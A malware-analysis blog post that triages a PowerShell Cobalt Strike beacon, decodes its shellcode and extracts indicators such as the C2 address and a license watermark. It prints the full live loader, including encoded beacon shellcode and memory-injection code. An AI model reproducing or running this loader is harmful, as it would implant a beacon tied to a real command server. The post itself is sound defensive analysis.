---
layout: post
title: "Inspecting a PowerShell Cobalt Strike Beacon"
date: 2022-01-09
categories: malware powershell "cobalt strike"
permalink: /inspecting-powershell-cobalt-strike-beacon/
---

In this post I want to take a look at a PowerShell-based Cobalt Strike beacon that appeared on MalwareBazaar. This particular beacon is representative of most PowerShell Cobalt Strike activity I see in the wild during my day job. The beacons often show up as service persistence during incidents or during other post-exploitation activity. If you want to follow along at home, the sample I'm using is here:

[https://bazaar.abuse.ch/sample/6881531ab756d62bdb0c3279040a5cbe92f9adfeccb201cca85b7d3cff7158d3/](https://bazaar.abuse.ch/sample/6881531ab756d62bdb0c3279040a5cbe92f9adfeccb201cca85b7d3cff7158d3/)

## Triaging the File

Just like with other files, let's approach with caution and verify the file is actually PowerShell. We can use `file` and `head` to do this.

```console
remnux@remnux:~/cases/cobaltstrike$ file payload.ps1 
payload.ps1: ASCII text, with very long lines

remnux@remnux:~/cases/cobaltstrike$ head -c 100 payload.ps1 
Set-StrictMode -Version 2

$DoIt = @'
ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX2
```

We definitely have some PowerShell here. The cmdlet [`Set-StrictMode`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/set-strictmode?view=powershell-7.2) is a PowerShell feature used to enforce "scripting best practices." In addition, the `@'` signals the use of a "[here-string](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_quoting_rules?view=powershell-7.2#here-strings)", a string that may use multiple quotation mark literals and multiple lines of text. Now that we have a grasp of the file type, let's take a look at the contents.

## Inspecting the File Contents

I personally love VSCode for inspecting code files, I know others typically get along with Sublime Editor as well. In this sample, we can observe:

```powershell
Set-StrictMode -Version 2

$DoIt = @'
ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t1d1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVVZOQUl4d2tEMnZhVVlpUVVVbGlNejlqdXpUellBNkYwbzE4K0J5VzJNMU5sdzA3Y0JxUmEyZ3F5Mm5DWEZacGVJWGU3QnowK09uZ0NPNHQwbXdCVHFyRTU3cnloTHY3WjJrOGhaRzBJMnRNVUZjWkEweFdWMDlNVEVnTlQwcFZSZzFBVEU0dUtXSkFRRVpUVnhrRENRd0pMaWwyVUVaUkRtSkVSazFYR1FOdVRGbEtUMDlDREJZTkV3TUxkRXBOUjB4VVVBTnRkd01WRFJJS0EySlRVMDlHZEVaQmFFcFhEQllRRkEwUUZRTUxhR3QzYm04UEEwOUtTRVlEWkVaQVNFd0tMaWtqNGZpdWVPdVlsenRONFpmWnpLQkJqaE5yNmZGUmVBeWk4TG81NEVDSnZOc3plYlJnb0JZd3AxUTNXbENtSm5qZWkyTW5JQ1BlZ1JGR3ZpNnlRZzBxdXczb0kxeWZFTXNUektLVi9OaEg0THdGYVBYODlLQXJ1QzR5ZUJCV0pxODJLN0YvTUtoekd0Y2wvSGF6ZU1CYUh2ZFRheDlZdFVORGRqazZUNVlvc0JhdFlxMm51T09ONmI0amN4eS9uQnQ5dlE4aHFTQkx5RkYyY2NJNkI2NTUxUkpNSEF3d25tVzMrOTFHa2daWmFGZlJxOWJucVVaME5pTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNGeFFORVJjUkRSSVZGdzBRRUNOeUtweE8nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p
'@
$aa1234 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DoIt))
If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $aa1234 | wait-job | Receive-Job
}
else {
	IEX $aa1234
}
```

We can see the contents of `$DoIt` contain a decently-sized chunk of base64 text, but it's likely not big enough to be a complete Windows EXE. The contents of the base64 string are decoded, converted to UTF-8 and then executed using a combination of [`Start-Job`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7.2) and [`Invoke-Expression`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) commands.

To get our next step, let's decode the base64 string manually using `base64 -d`. I've gone ahead and included the decoded code here:

```powershell
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuwPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMUVNAIxwkD2vaUYiQUUliMz9juzTzYA6F0o18+ByW2M1Nlw07cBqRa2gqy2nCXFZpeIXe7Bz0+OngCO4t0mwBTqrE57ryhLv7Z2k8hZG0I2tMUFcZA0xWV09MTEgNT0pVRg1ATE4uKWJAQEZTVxkDCQwJLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRIKA2JTU09GdEZBaEpXDBYQFA0QFQMLaGt3bm8PA09KSEYDZEZASEwKLikj4fiueOuYlztN4ZfZzKBBjhNr6fFReAyi8Lo54ECJvNszebRgoBYwp1Q3WlCmJnjei2MnICPegRFGvi6yQg0quw3oI1yfEMsTzKKV/NhH4LwFaPX89KAruC4yeBBWJq82K7F/MKhzGtcl/HazeMBaHvdTax9YtUNDdjk6T5YosBatYq2nuOON6b4jcxy/nBt9vQ8hqSBLyFF2ccI6B6551RJMHAwwnmW3+91GkgZZaFfRq9bnqUZ0NiNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxQNERcRDRIVFw0QECNyKpxO')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
```

There's a LOT to unpack here and wrap our brains around. To keep this post short and sweet, there are two portions to focus upon:

- The contents of `$var_code`
- The chunk of code containing `$var_code[$x] = $var_code[$x] -bxor 35`

Suffice to say, the rest of the code is overhead required to inject shellcode reflectively into the memory space of the PowerShell process executing the script. If you're curious about those portions, take a look into these keywords:

- GetProcAddress
- InMemoryModule
- ReflectedDelegate

### Decoding the Shellcode

The `$var_code` variable contains Cobalt Strike beacon shellcode that was XOR'd with the value `35` before being base64 encoded. We can decode all this PowerShell on any platform. I'm using the command `pwsh` to do this on REMnux.

```powershell
PS /home/remnux/cases/cobaltstrike> [Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuwPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMUVNAIxwkD2vaUYiQUUliMz9juzTzYA6F0o18+ByW2M1Nlw07cBqRa2gqy2nCXFZpeIXe7Bz0+OngCO4t0mwBTqrE57ryhLv7Z2k8hZG0I2tMUFcZA0xWV09MTEgNT0pVRg1ATE4uKWJAQEZTVxkDCQwJLil2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLdEpNR0xUUANtdwMVDRIKA2JTU09GdEZBaEpXDBYQFA0QFQMLaGt3bm8PA09KSEYDZEZASEwKLikj4fiueOuYlztN4ZfZzKBBjhNr6fFReAyi8Lo54ECJvNszebRgoBYwp1Q3WlCmJnjei2MnICPegRFGvi6yQg0quw3oI1yfEMsTzKKV/NhH4LwFaPX89KAruC4yeBBWJq82K7F/MKhzGtcl/HazeMBaHvdTax9YtUNDdjk6T5YosBatYq2nuOON6b4jcxy/nBt9vQ8hqSBLyFF2ccI6B6551RJMHAwwnmW3+91GkgZZaFfRq9bnqUZ0NiNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcFxQNERcRDRIVFw0QECNyKpxO')

PS /home/remnux/cases/cobaltstrike> for ($x = 0; $x -lt $var_code.Count; $x++) {
>> $var_code[$x] = $var_code[$x] -bxor 35

PS /home/remnux/cases/cobaltstrike> Set-Content -Path ./shellcode.bin -Value $var_code -AsByteStream
```

Now we can take a look at the `shellcode.bin` file to get indicators. Also, the [XOR with 35](https://www.google.com/search?q=bxor+35+cobalt+strike) is an indicator that the beacon is Cobalt Strike and not Metasploit or similar.

## Getting Indicators from the Shellcode

Let's verify we have some functioning shellcode. We can do this with `capa`. 

```console
remnux@remnux:~/cases/cobaltstrike$ capa -f sc32 shellcode.bin 

+------------------------+------------------------------------------------------------------+
| md5                    | 63603bb6854a022e997a06fe7220a220                                 |
| sha1                   | ce72e661393227a1816e43159139860660118ccb                         |
| sha256                 | 0a0dddca72464f3baa600be64e9f7da9c0cbe1126e8e713d0c9dba6ed231234a |
| path                   | shellcode.bin                                                    |
+------------------------+------------------------------------------------------------------+

+------------------------+------------------------------------------------------------------+
| ATT&CK Tactic          | ATT&CK Technique                                                 |
|------------------------+------------------------------------------------------------------|
| DEFENSE EVASION        | Virtualization/Sandbox Evasion::System Checks T1497.001          |
| EXECUTION              | Shared Modules:: T1129                                           |
+------------------------+------------------------------------------------------------------+

+-----------------------------+-------------------------------------------------------------+
| MBC Objective               | MBC Behavior                                                |
|-----------------------------+-------------------------------------------------------------|
| ANTI-BEHAVIORAL ANALYSIS    | Virtual Machine Detection::Instruction Testing [B0009.029]  |
+-----------------------------+-------------------------------------------------------------+

+------------------------------------------------------+------------------------------------+
| CAPABILITY                                           | NAMESPACE                          |
|------------------------------------------------------+------------------------------------|
| execute anti-VM instructions                         | anti-analysis/anti-vm/vm-detection |
| access PEB ldr_data                                  | linking/runtime-linking            |
| parse PE exports                                     | load-code/pe                       |
+------------------------------------------------------+------------------------------------+
```

We definitely have some shellcode functionality here. The important part for me is the part about `access PEB ldr data`. This capability refers to the ability of the shellcode to resolve imports so it can use functions from DLLs. Shellcode doesn't have an import table like standard Windows EXEs do, so it has to go the long way around to find all its needed functions.

Since we're pretty sure this is a Cobalt Strike we can get further indicators using a couple tools. The first and simplest is `strings`.

```console
remnux@remnux:~/cases/cobaltstrike$ strings shellcode.bin 
;}$u
D$$[[aYZQ
]hnet
hwiniThLw&
WWWWWh:Vy
SPhW
RRRSRPh
SVh
hE!^1
QVPh
/rpc
Host: outlook.live.com
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
pH<{
1o?/
%zKt
47.242.164[.]33
```

We can see some elements in the strings that could appear in HTTP traffic. These details are:

- `47.242.164[.]33/rpc` is likely the command and control address
- `User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)` is a HTTP User-Agent string
- `Host: outlook.live.com` and `Accept: */*` are HTTP header values

Another good way to glean indicators is using `1768.py`, a tool specifically designed to pull Cobalt Strike configuration details from beacons.

```console
remnux@remnux:~/cases/cobaltstrike$ 1768.py --raw shellcode.bin 
File: shellcode.bin
Probably found shellcode:
Parameter: 778 b'47.242.164.33'
license-id: 792 1359593325
push      :   190       8083 b'h\x93\x1f\x00\x00'
push      :   716       4096 b'h\x00\x10\x00\x00'
push      :   747       8192 b'h\x00 \x00\x00'
String: 440 b'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)'
00000000: FC E8 89 00 00 00 60 89  E5 31 D2 64 8B 52 30 8B  ......`..1.d.R0.
00000010: 52 0C 8B 52 14 8B 72 28  0F B7 4A 26 31 FF 31 C0  R..R..r(..J&1.1.
00000020: AC 3C 61 7C 02 2C 20 C1  CF 0D 01 C7 E2 F0 52 57  .<a|., .......RW
00000030: 8B 52 10 8B 42 3C 01 D0  8B 40 78 85 C0 74 4A 01  .R..B<...@x..tJ.

...
```

We have a little confirmation on indicators here, and we also got an additional one: a license ID. Cobalt Strike beacons are supposed to contain watermarks/license IDs that allow analysts to track a beacon back to one particular licensee. In this case, we see the value `1359593325`. This value has been seen with loads of different activity in recent years from [different groups](https://www.google.com/search?q=%221359593325%22).

And that's it for this post! If you've never seen a Cobalt Strike beacon before, this is probably the simplest version I've seen in a long time. Thank you for reading!